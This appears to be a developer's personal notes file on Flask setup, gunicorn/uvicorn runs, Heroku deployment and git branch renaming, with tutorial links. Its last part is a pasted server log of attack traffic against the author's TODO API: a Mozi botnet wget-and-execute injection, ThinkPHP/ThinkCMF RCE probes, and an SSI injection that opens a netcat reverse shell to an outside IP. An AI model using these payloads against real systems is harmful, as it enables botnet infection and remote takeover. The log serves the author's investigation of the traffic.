# Notes

## Contributing
- Fork it.
- Create a branch (git checkout -b my_malice)
- Commit your changes (git commit -am "Added Something Cool")
- Push to the branch (git push origin my_malice)
- Open a Pull Request
- Wait for me to figure out what the heck a pull request is...

## Flash 
-from flask import flask

pip3 install flask
pip3 install flask-cors
sudo apt-get update && sudo apt-get upgrade
sudo apt-get install python3.10
apt install python3-pip
apt install python3-flask
pip3 install -r requirements.txt
export FLASK_APP=app.py
export FLASK_ENV=development
flask run -h 0.0.0.0 -p 8080
flask run

## Cheat cheat
- curl cht.sh/python/flask


## Live server
from liveserver import LiveServer
ls = LiveServer(app)
    ls.run("0.0.0.0", 8080)

## uvicorn
uvicorn app:app --reload --port 80 --host 0.0.0.0

gunicorn -w 4 --bind 0.0.0.0:8000 wsgi:app


## Videos:
https://github.com/jakerieger/FlaskIntroduction/blob/master/templates/index.html


## Heroku
-$ heroku login
$ cd my-project/

$ git init OR - $ heroku git:remote -a maks-todo-api
$ heroku git:remote -a maks-todo-api

$ git add .
$ git commit -am "make it better"
$ git push heroku master

git branch -a
git push heroku main


To switch the default branch used to deploy apps from master to main, first create a new branch locally:

git checkout -b main
Next, delete the old default branch locally:

git branch -D master
From there, the local environment only knows about the main branch.

Reset the GIT repository hosted on the Heroku Platform using the heroku-reset command from the heroku-repo CLI plugin. Doing so will not impact the running application. (Note: Please communicate this change with your team. If you are working with other developers who are not aware of the reset, they might push to "master" which will overwrite the reset).

Re-deploy the application using the new default branch:

git push heroku main

todo/update/add/delete- Jinja
https://www.youtube.com/watch?v=yKHJsLUENl0
https://github.com/python-engineer/flask-todo/blob/master/templates/base.html

todo/update/add/delte/status/ jinja/some JS - most deep
https://github.com/a2975667/flask-gcp-mysql-demo
https://tichung.com/blog/2021/20200323_flask/

todo/update/
https://www.youtube.com/watch?v=Z1RJmh_OqeA

blog/users
https://www.youtube.com/watch?v=74NW-84BqbA&t=1818s

Vidoes/likes/views
https://www.youtube.com/watch?v=GMppyAPbLYk&t=253s


investigate from new TODO API Server
71.215.97.89 - - [13/May/2022 12:10:58] "GET /loadsavedtodo HTTP/1.1" 200 -
112.220.89.114 - - [13/May/2022 12:26:43] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
112.220.89.114 - - [13/May/2022 12:26:43] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -



ode 400, message Bad request version ('´\x10r\x88CÓó\x9eU´)Ó(¬=\x8a¼\xad|Û\x9d¸k\x14\x95¸m_¥\x17EÑ\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')                                                                       109.237.103.9 - - [17/May/2022 02:57:34] "D@                                                                                                  ®®¶CÓó¼­|Û¸m_¥EÑbÀ,À0À+À/Ì©Ì¨£" HTTPStatus.BAD_REQUEST
 -                                                                                                193.106.191.48 - - [17/May/2022 03:17:47] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -                    193.106.191.48 - - [17/May/2022 03:58:35] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 -                                                                                192.241.213.149 - - [17/May/2022 04:15:16] "GET / HTTP/1.1" 200 -                                 185.180.143.8 - - [17/May/2022 04:21:01] "GET / HTTP/1.1" 200 -                                   38.106.120.198 - - [17/May/2022 04:21:35] "GET / HTTP/1.1" 200 -                                  205.210.31.137 - - [17/May/2022 04:43:53] code 400, message Bad request version ('À(À$À\x14À')    205.210.31.137 - - [17/May/2022 04:43:53] "ÊÆ-*@máY[l7Zðáå«,÷3ÂÔDà}íªÖsÕßhÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ    À(À$ÀÀ" HTTPStatus.BAD_REQUEST -                                                                    89.104.110.102 - - [17/May/2022 04:53:19] "GET / HTTP/1.1" 200 -                                  176.53.216.46 - - [17/May/2022 04:53:20] "GET /favicon.ico HTTP/1.1" 404 -                        94.102.61.10 - - [17/May/2022 04:59:45] "GET / HTTP/1.1" 200 -                                    193.106.191.48 - - [17/May/2022 05:00:28] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -    45.148.10.81 - - [17/May/2022 05:51:08] "GET /incl/image_test.shtml?camnbr=%3c!--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 -                                                                 193.106.191.48 - - [17/May/2022 05:56:39] "GET /console/ HTTP/1.1" 404 -                          193.106.191.48 - - [17/May/2022 06:06:29] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 




 changki.com